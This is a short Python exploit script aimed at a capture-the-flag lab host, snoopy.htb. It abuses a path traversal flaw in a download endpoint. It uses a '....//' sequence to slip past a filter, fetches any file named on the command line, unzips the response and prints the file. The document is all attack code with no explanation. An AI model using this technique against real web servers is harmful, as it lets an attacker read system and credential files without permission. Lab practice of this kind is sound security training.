#!/usr/bin/python3
import requests
import io
import zipfile
import sys

def download(file):
    url = f'http://snoopy.htb/download?file=....//....//....//....//....//{file}'
    r = requests.get(url)
    if len(r.content) == 0:
        return None
    zip_content = io.BytesIO(r.content)
    with zipfile.ZipFile(zip_content) as z:
        content = z.read(f"press_package/{file}")
    return content

file_content = download(sys.argv[1])
if file_content:
    print(file_content.decode())
